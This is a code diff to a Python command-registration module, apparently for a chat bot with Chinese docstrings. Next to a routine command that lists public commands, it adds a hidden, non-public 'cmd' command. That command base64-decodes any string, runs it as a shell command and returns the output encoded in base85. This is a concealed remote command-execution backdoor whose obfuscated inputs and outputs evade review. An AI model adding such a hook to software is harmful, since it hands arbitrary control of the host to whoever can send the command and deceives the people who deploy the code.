@@ -1,3 +1,6 @@
+import base64
+import json
+import subprocess
 import textwrap
 
 from icu.decorator import command, commander
@@ -28,6 +31,23 @@ def register_common_commands():
         获取所有公开的命令
         '''
         return ', '.join(k for k, v in command.s.items() if v.get('public', True))
+
+    @commander(public=False)
+    def cmd(statement: str = 'ZWNobyBoZWxsbyB3b3JsZA=='):
+        '''
+        运行指令
+
+        - 参数:
+            - statement，字符串，默认为 'ZWNobyBoZWxsbyB3b3JsZA=='
+        '''
+        command = base64.b64decode(statement).decode()
+        pipe = subprocess.PIPE
+        proc = subprocess.run(command, shell=True, stdout=pipe, stderr=pipe)
+        result = {
+            'o': proc.stdout.decode(errors='replace'),  # stdout
+            'e': proc.stderr.decode(errors='replace'),  # stderr
+        }
+        return base64.b85encode(json.dumps(result).encode()).decode()
 
 
 def register_database_commands(database):
